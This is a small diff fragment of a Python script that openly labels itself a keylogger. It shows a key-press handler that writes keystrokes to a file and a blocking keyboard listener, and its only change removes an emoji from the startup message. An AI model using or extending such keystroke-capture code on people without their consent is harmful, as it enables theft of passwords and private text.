@@ -11,7 +11,7 @@ def on_press(key):
             f.write(f" [{key}] ")
 
 def main():
-    print("🔒 Keylogger started. Press shift+F5 to stop.")
+    print("Keylogger started. Press shift+F5 to stop.")
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()  # Run the listener in blocking mode
 
